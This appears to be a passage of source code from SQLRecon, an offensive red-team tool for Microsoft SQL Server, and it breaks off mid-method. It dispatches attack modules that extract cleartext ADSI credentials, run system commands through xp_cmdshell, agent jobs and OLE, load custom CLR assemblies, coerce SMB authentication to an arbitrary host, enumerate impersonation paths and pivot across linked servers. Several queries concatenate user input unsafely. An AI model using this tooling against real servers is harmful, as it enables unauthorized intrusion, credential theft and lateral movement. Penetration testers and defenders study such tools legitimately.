using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using System.Text;
using SQLRecon.Modules;
using SQLRecon.Utilities;

namespace SQLRecon.Commands
{
    internal class ModuleHandler
    {
        private static GlobalVariables _gV = new();
        private static readonly ADSI _adsi = new();
        private static readonly AgentJobs _agentJobs = new();
        private static readonly CLR _clr = new();
        private static readonly Configure _config = new();
        private static readonly OLE _ole = new();
        private static readonly PrintUtils _print = new();
        private static readonly Roles _roles = new();
        private static readonly Sccm _sccm = new();
        private static readonly SqlQuery _sqlQuery = new();
        private static readonly XpCmdShell _xpCmdShell = new();

        private static readonly SqlConnection _connection = _gV.Connect;
        private static readonly string _arg0 = _gV.Arg0;
        private static readonly string _arg1 = _gV.Arg1;
        private static readonly string _arg2 = _gV.Arg2;
        private static readonly string _database = _gV.Database;
        private static readonly string _impersonate = _gV.Impersonate;
        private static readonly string _linkedSqlServer = _gV.LinkedSqlServer;
        private static readonly string[] _tunnelSqlServer = _gV.TunnelSqlServer;
        private static readonly string _tunnelPath = _gV.TunnelPath;
        private static readonly string _module = _gV.Module;
        private static readonly string _sqlServer = _gV.SqlServer;

        private static string _query;

        /// <summary>
        /// The ExecuteModule method will match the user supplied module in the
        /// _module variable against a method name and use reflection to execute
        /// the method in the local class.
        /// </summary>
        public static void ExecuteModule()
        {
            // First check to see if there is a SQL connection object.
            if (_connection == null)
            {
                // Go no futher.
                return;
            }

            _query = "SELECT SYSTEM_USER;";
            _print.Success(string.Format("Logged in as server user '{0}'",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            _query = "SELECT USER_NAME();";
            _print.Success(string.Format("Mapped to the username '{0}'",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            if (!string.IsNullOrEmpty(_impersonate))
            {
                _sqlQuery.Impersonate(_connection, _impersonate);
            }


            // Reference: https://stackoverflow.com/questions/29034093/create-instance-of-class-and-call-method-from-string/29034215
            // Set the type name to this local class.
            Type type = Type.GetType(MethodBase.GetCurrentMethod().DeclaringType.ToString());

            if (type != null)
            {
                // Match the method name to the module that has been supplied as an argument.
                MethodInfo method = type.GetMethod(_module);

                if (method != null)
                {
                    // Call the method.
                    method.Invoke(null, null);
                }
                else
                {
                    _print.Error("Invalid module.", true);
                    // Go no futher.
                    return;
                }
            }
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ****************** Standard SQL Server Modules ******************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The adsi method is used against single instances of SQL server to
        /// obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void adsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {0}", _sqlServer, _arg1), true);
            _adsi.Standard(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The agentcmd method is used against single instances of SQL server to
        /// execute commands via agent jobs.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void agentcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _agentJobs.Standard(_connection, _sqlServer, _arg1);
        }

        /// <summary>
        /// The agentstatus method is used against single instances of SQL server to
        /// check to see if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void agentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0}", _sqlServer), true);
            _agentJobs.GetAgentStatusAndJobs(_connection, _sqlServer);
        }

        /// <summary>
        /// The checkrpc method is used against the initial SQL server to
        /// identify what systems can have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void checkrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC configured via {0}", _sqlServer), true);
            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The clr method is used against single instances of SQL server to
        /// execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void clr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack on {0}", _sqlServer), true);
            _clr.Standard(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The columns method is used against single instances of SQL server to
        /// list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void columns()
        {
            _print.Status(string.Format("Displaying columns from table '{1}' in '{0}' on {2}",
                _arg1, _arg2, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                "WHERE TABLE_NAME = '" + _arg2 + "' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The databases method is used against single instances of SQL server to
        /// show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void databases()
        {
            _print.Status(string.Format("Databases on {0}", _sqlServer), true);
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(_connection, _query));
        }

        /// <summary>
        /// The disableclr method is used against single instances of SQL server to
        /// disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disableclr()
        {
            _print.Status(string.Format("Disabling CLR integration on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "0", _sqlServer);
        }

        /// <summary>
        /// The disableole method is used against single instances of SQL server to
        /// disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disableole()
        {
            _print.Status(string.Format("Disabling Ole Automation Procedures on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "0", _sqlServer);
        }

        /// <summary>
        /// The disablerpc method is used against the initial SQL server to
        /// disable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disablerpc()
        {
            _print.Status(string.Format("Disabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "false", _arg1);
        }

        /// <summary>
        /// The disablexp method is used against single instances of SQL server to
        /// disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void disablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "0", _sqlServer);
        }

        /// <summary>
        /// The enableclr method is used against single instances of SQL server to
        /// enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enableclr()
        {
            _print.Status(string.Format("Enabling CLR integration on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "1", _sqlServer);
        }

        /// <summary>
        /// The enableole method is used against single instances of SQL server to
        /// enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enableole()
        {
            _print.Status(string.Format("Enabling Ole Automation Procedures on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "1", _sqlServer);
        }

        /// <summary>
        /// The enablerpc method is used against the initial SQL server to
        /// enable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enablerpc()
        {
            _print.Status(string.Format("Enabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1);
        }

        /// <summary>
        /// The enablexp method is used against single instances of SQL server to
        /// enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell on {0}", _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "1", _sqlServer);
        }

        /// <summary>
        /// The impersonate method is used against single instances of SQL server to
        /// identify if any SQL accounts can be impersonated. This method is particularly
        /// crucial for understanding potential privilege escalation paths.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void impersonate()
        {
            _print.Status($"Enumerating accounts that can be impersonated on {_sqlServer}", true);

            // Check if the current user is a sysadmin
            string sysAdminCheckQuery = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string isSysAdmin = _sqlQuery.ExecuteCustomQuery(_connection, sysAdminCheckQuery).Trim();

            var allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
            var allLogins = _sqlQuery.ExecuteCustomQuery(_connection, allLoginsQuery);

            var logins = _sqlQuery.ExtractColumnValues(allLogins, "name");

            var impersonables = new List<string>();

            if (isSysAdmin.Contains("1"))
            {
                // If the user is a sysadmin, they can impersonate any login
                _print.Status("Current user is a sysadmin and can impersonate any account.", true);

                if (logins.Any())
                {
                    impersonables.AddRange(logins);
                }
            }
            else
            {
                if (logins.Any())
                {
                    foreach (var login in logins)
                    {
                        if (_sqlQuery.CanImpersonate(_connection, login))
                        {
                            impersonables.Add(login);
                        }
                    }
                }
            }

            if (impersonables.Any())
            {
                _print.Status("Users that can be impersonated:", true);
                foreach (var impersonable in impersonables)
                {
                    _print.Nested(impersonable, true);
                }
            }
            else
            {
                _print.Error("No logins found that can be impersonated.", true);
            }
        }


        /// <summary>
        /// The info method is used against single instances of SQL server to
        /// gather information about the remote SQL server instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void info()
        {
            _print.Status(string.Format("Extracting SQL Server information from {0}", _sqlServer), true);
            var Info = new SqlServerInfo(_connection);
            Info.GetAllSQLServerInfo();
            Info.PrintInfo();
        }

        /// <summary>
        /// The links method is used against single instances of SQL server to
        /// determine if the remote SQL server has a link configured to other SQL servers.
        /// It provides detailed information about each linked server, including the local login mapping,
        /// whether self-mapping is used, the remote login, and other linked server properties.
        /// </summary>
        public static void links()
        {
            _print.Status($"Additional SQL links and login mappings on {_sqlServer}", true);

            // Query to fetch detailed linked server information along with login mappings
            _query = @"
        SELECT
            srv.name AS [Linked Server],
            srv.product,
            srv.provider,
            srv.data_source,
            COALESCE(prin.name, 'N/A') AS [Local Login],
            ll.uses_self_credential AS [Is Self Mapping],
            ll.remote_name AS [Remote Login]
        FROM
            sys.servers srv
            LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id
            LEFT JOIN sys.server_principals prin ON ll.local_principal_id = prin.principal_id
        WHERE
            srv.is_linked = 1;";

            // Execute the query and check if the output is empty
            string result = _sqlQuery.ExecuteCustomQuery(_connection, _query);
            _print.IsOutputEmpty(result, true);
        }


        /// <summary>
        /// The olecmd method is used against single instances of SQL server to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void olecmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _ole.Standard(_connection, _arg1);
        }

        /// <summary>
        /// The query method is used against single instances of SQL server to
        /// execute a user supplied SQL query.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void query()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _arg1), true);
        }

        /// <summary>
        /// The rows method is used against single instances of SQL server to
        /// determine the number of ` in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void rows()
        {
            _print.Status(string.Format("Displaying number of rows from table '{1}' in '{0}' on {2}",
                _arg1, _arg2, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The search method is used against single instances of SQL server to
        /// search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void search()
        {
            _print.Status(string.Format("Searching for columns containing '{0}' in '{1}' on {2}",
                _arg1, _database, _sqlServer), true);

            _query = "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%" + _arg1 + "%';";

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }

        /// <summary>
        /// The smb method is used against single instances of SQL server to
        /// make the SQL server solicit a SMB request to an arbitrary host.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void smb()
        {
            CaptureHash _ = new(_connection, _arg1);
            _print.Status(string.Format("Sent SMB Request to {0}", _arg1), true);
        }

        /// <summary>
        /// The tables method is used against single instances of SQL server to
        /// retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void tables()
        {
            _print.Status(string.Format("Tables in {0}", _arg1), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);
        }



        /// <summary>
        /// The xpcmd method is used against single instances of SQL server to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void xpcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1}", _arg1, _sqlServer), true);
            _xpCmdShell.Standard(_connection, _arg1);
        }



        /// <summary>
        /// The iwhoami method is used in conjunction with an account that can be
        /// impersonated to determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void iwhoami()
        {
            DetermineUserPermissions(
                _connection,
                _sqlServer,
                impersonate: _impersonate);
        }

        /// <summary>
        /// The whoami method is used against single instances of SQL server to
        /// determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void whoami()
        {
            DetermineUserPermissions(
                _connection,
                _sqlServer);
        }

        /// <summary>
        /// The lwhoami method is used against linked SQL servers to
        /// determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void lwhoami()
        {
            DetermineUserPermissions(
                _connection,
                _sqlServer,
                linkedSqlServer: _linkedSqlServer);
        }

        /// <summary>
        /// The twhoami method is used against a chain of linked SQL servers to
        /// determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void twhoami()
        {
            DetermineUserPermissions(
                _connection,
                _sqlServer,
                tunnelSqlServers: _tunnelSqlServer);
        }

        // users

        /// <summary>
        /// The users method is used against single instances of SQL server to
        /// obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void users()
        {
            string contextDescription = $"{_database} database on {_sqlServer}";

            RetrieveUsers(_connection, contextDescription);
        }

        /// <summary>
        /// The iusers method is used in conjunction with an account that can be
        /// impersonated to obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void iusers()
        {
            string contextDescription = $"{_database} database on {_sqlServer} as '{_impersonate}'";
            RetrieveUsers(_connection, contextDescription, _impersonate);
        }

        /// <summary>
        /// The lusers method is used against linked SQL servers to
        /// obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void lusers()
        {
            string contextDescription = $"{_database} database on {_linkedSqlServer} via {_sqlServer}";
            RetrieveUsers(_connection, contextDescription, linkedSqlServer: _linkedSqlServer);
        }

        /// <summary>
        /// The tusers method is used against a chain of linked SQL servers to
        /// obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void tusers()
        {
            string contextDescription = $"{_database} database from tunnel {_tunnelPath}";
            RetrieveUsers(_connection, contextDescription, tunnelSqlServers: _tunnelSqlServer);
        }


        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ************************ Main Methods  **************************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        // That is the whoami
        private static void DetermineUserPermissions(
            SqlConnection connection,
            string sqlServer,
            string linkedSqlServer = null,
            string impersonate = null,
            string[] tunnelSqlServers = null)
        {
            string query;
            string contextDescription = sqlServer;

            if (impersonate != null)
            {
                contextDescription += $" as '{impersonate}'";
            }
            else if (linkedSqlServer != null)
            {
                contextDescription += $" via {linkedSqlServer}";
            }
            else if (tunnelSqlServers != null)
            {
                contextDescription += $" via tunnel {string.Join(" -> ", tunnelSqlServers)}";
            }

            _print.Status($"Determining user permissions on {contextDescription}", true);

            query = "SELECT SYSTEM_USER;";
            string loggedInUser = (impersonate, linkedSqlServer, tunnelSqlServers) switch
            {
                (not null, _, _) => _sqlQuery.ExecuteImpersonationQuery(connection, impersonate, query),
                (_, not null, _) => _sqlQuery.ExecuteLinkedQuery(connection, linkedSqlServer, query),
                (_, _, not null) => _sqlQuery.ExecuteTunnelQuery(connection, tunnelSqlServers, query),
                _ => _sqlQuery.ExecuteQuery(connection, query)
            };
            _print.Success($"Logged in as {loggedInUser}", true);

            query = "SELECT USER_NAME();";
            string mappedUser = (impersonate, linkedSqlServer, tunnelSqlServers) switch
            {
                (not null, _, _) => _sqlQuery.ExecuteImpersonationQuery(connection, impersonate, query),
                (_, not null, _) => _sqlQuery.ExecuteLinkedQuery(connection, linkedSqlServer, query),
                (_, _, not null) => _sqlQuery.ExecuteTunnelQuery(connection, tunnelSqlServers, query),
                _ => _sqlQuery.ExecuteQuery(connection, query)
            };
            _print.Success($"Mapped to the user {mappedUser}", true);

            query = "SELECT [name] FROM sysusers WHERE issqlrole = 1;";
            string getRoles = (impersonate, linkedSqlServer, tunnelSqlServers) switch
            {
                (not null, _, _) => _sqlQuery.ExecuteImpersonationCustomQuery(connection, impersonate, query),
                (_, not null, _) => _sqlQuery.ExecuteLinkedCustomQuery(connection, linkedSqlServer, query),
                (_, _, not null) => _sqlQuery.ExecuteTunnelCustomQuery(connection, tunnelSqlServers, query),
                _ => _sqlQuery.ExecuteCustomQuery(connection, query)
            };

            List<string> rolesList = _sqlQuery.ExtractColumnValues(getRoles, "name");

            string[] defaultRoles = { "sysadmin", "setupadmin", "serveradmin", "securityadmin",
                "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            string[] combinedRoles = rolesList.Concat(defaultRoles).ToArray();

            var memberRoles = new List<string>();
            var nonMemberRoles = new List<string>();

            foreach (var item in combinedRoles)
            {
                bool isMember = (impersonate, linkedSqlServer, tunnelSqlServers) switch
                {
                    (not null, _, _) => _roles.CheckImpersonatedRole(connection, item.Trim(), impersonate, false),
                    (_, not null, _) => _roles.CheckLinkedServerRole(connection, item.Trim(), linkedSqlServer, false),
                    (_, _, not null) => _roles.CheckTunnelServerRole(connection, item.Trim(), tunnelSqlServers, false),
                    _ => _roles.CheckServerRole(connection, item.Trim(), false)
                };

                if (isMember)
                {
                    memberRoles.Add(item.Trim());
                }
                else
                {
                    nonMemberRoles.Add(item.Trim());
                }
            }

            _print.Success("User is a member of roles below:", true);
            foreach (var role in memberRoles)
            {
                _print.Nested(role, true);
            }

            _print.Error("User is NOT a member of roles below:", true);
            foreach (var role in nonMemberRoles)
            {
                _print.Nested(role, true);
            }
        }

        // That is the users
        private static void RetrieveUsers(
            SqlConnection connection,
            string contextDescription,
            string impersonate = null,
            string linkedSqlServer = null,
            string[] tunnelSqlServers = null)
        {
            string dbQuery = "SELECT name AS username, create_date, modify_date, type_desc AS type, " +
                            "authentication_type_desc AS authentication_type " +
                            "FROM sys.database_principals " +
                            "WHERE type NOT IN ('A', 'R', 'X') AND sid IS NOT null AND name NOT LIKE '##%' " +
                            "ORDER BY modify_date DESC;";

            string serverQuery = "SELECT name, type_desc, is_disabled, create_date, modify_date " +
                                "FROM sys.server_principals " +
                                "WHERE name NOT LIKE '##%' " +
                                "ORDER BY modify_date DESC;";

            string dbUsers = (impersonate, linkedSqlServer, tunnelSqlServers) switch
            {
                (not null, _, _) => _sqlQuery.ExecuteImpersonationCustomQuery(connection, impersonate, dbQuery),
                (_, not null, _) => _sqlQuery.ExecuteLinkedCustomQuery(connection, linkedSqlServer, dbQuery),
                (_, _, not null) => _sqlQuery.ExecuteTunnelCustomQuery(connection, tunnelSqlServers, dbQuery),
                _ => _sqlQuery.ExecuteCustomQuery(connection, dbQuery)
            };

            string serverUsers = (impersonate, linkedSqlServer, tunnelSqlServers) switch
            {
                (not null, _, _) => _sqlQuery.ExecuteImpersonationCustomQuery(connection, impersonate, serverQuery),
                (_, not null, _) => _sqlQuery.ExecuteLinkedCustomQuery(connection, linkedSqlServer, serverQuery),
                (_, _, not null) => _sqlQuery.ExecuteTunnelCustomQuery(connection, tunnelSqlServers, serverQuery),
                _ => _sqlQuery.ExecuteCustomQuery(connection, serverQuery)
            };

            _print.Status($"Users in the '{contextDescription}':", true);
            _print.Nested("Database Principals:", true);
            Console.WriteLine(dbUsers);
            _print.Nested("Server Principals:", true);
            Console.WriteLine(serverUsers);
        }



        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ******************* Linked SQL Server Modules *******************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The ladsi method is used against linked SQL servers to
        /// obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ladsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {2} via {1}",
                _sqlServer, _arg1, _linkedSqlServer), true);
            _adsi.Linked(_connection, _arg1, _arg2, _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lagentcmd method is used against linked SQL servers to
        /// execute commands via agent jobs using PowerShell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lagentcmd()
        {
            _print.Status(string.Format("Executing '{0}' using PowerShell on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _agentJobs.Linked(_connection, _linkedSqlServer, "PowerShell", _arg1, _sqlServer);
        }

        /// <summary>
        /// The lagentstatus method is used against linked SQL servers to
        /// check to see if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lagentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _agentJobs.GetLinkedAgentStatusAndJobs(_connection, _linkedSqlServer);
        }

        /// <summary>
        /// The lcheckrpc method is used against linked SQL servers to
        /// to identify what systems linked off the linked SQL server can have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lcheckrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC configured on {0} via {1}"
                , _linkedSqlServer, _sqlServer), true);

            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lcolumns method is used against linked SQL servers to
        /// to list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void lcolumns()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                   _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Displaying columns from '{1}' in '{0}' on {2} via {3}",
                _arg1, _arg2, _linkedSqlServer, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
               "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
               "WHERE TABLE_NAME = ''" + _arg2 + "'' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lclr method is used against linked SQL servers to execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lclr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _clr.Linked(_connection, _arg1, _arg2, _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldatabases method is used against linked SQL servers to
        /// show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldatabases()
        {
            _print.Status(string.Format("Databases on {0} via {1}", _linkedSqlServer, _sqlServer), true);
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
            Console.WriteLine(_sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, _query));
        }

        /// <summary>
        /// The ldisableclr method is used against linked SQL servers to
        /// disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisableclr()
        {
            _print.Status(string.Format("Disabling CLR integration on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "clr enabled", "0", _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldisableole method is used against linked SQL servers to
        /// disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisableole()
        {
            _print.Status(string.Format("Disabling OLE Automation Procedures on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "OLE Automation Procedures", "0",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The ldisablexp method is used against linked SQL servers to
        /// disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ldisablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "xp_cmdshell", "0",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenableclr method is used against linked SQL servers to
        /// enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenableclr()
        {
            _print.Status(string.Format("Enabling CLR integration on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "clr enabled", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenableole method is used against linked SQL servers to
        /// enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenableole()
        {
            _print.Status(string.Format("Enabling OLE Automation Procedures on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "OLE Automation Procedures", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The lenablexp method is used against linked SQL servers to
        /// enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lenablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell on {0} via {1}",
                _linkedSqlServer, _sqlServer), true);
            _config.LinkedModuleToggle(_connection, "xp_cmdshell", "1",
                _linkedSqlServer, _sqlServer);
        }

        /// <summary>
        /// The llinks method is used against linked instances of SQL server to
        /// determine if the remote linked SQL server has a link configured to other SQL servers.
        /// It provides detailed information about each linked server, including the local login mapping,
        /// whether self-mapping is used, the remote login, and other linked server properties.
        /// </summary>
        public static void llinks()
        {
            _print.Status($"Additional SQL links and login mappings on {_linkedSqlServer} via {_sqlServer}", true);

            // Query to fetch detailed linked server information along with login mappings
            _query = @"
                SELECT
                    srv.name AS [Linked Server],
                    srv.product,
                    srv.provider,
                    srv.data_source,
                    COALESCE(prin.name, ''N/A'') AS [Local Login],
                    ll.uses_self_credential AS [Is Self Mapping],
                    ll.remote_name AS [Remote Login]
                FROM
                    sys.servers srv
                    LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id
                    LEFT JOIN sys.server_principals prin ON ll.local_principal_id = prin.principal_id
                WHERE
                    srv.is_linked = 1";

            string result = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, _query);
            _print.IsOutputEmpty(result, true);
        }

        /// <summary>
        /// The limpersonate method is used against linked instances of SQL server to
        /// identify if any SQL accounts on the linked server can be impersonated. This method is particularly
        /// crucial for understanding potential privilege escalation paths on remote servers.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void limpersonate()
        {
            // Display the current server user
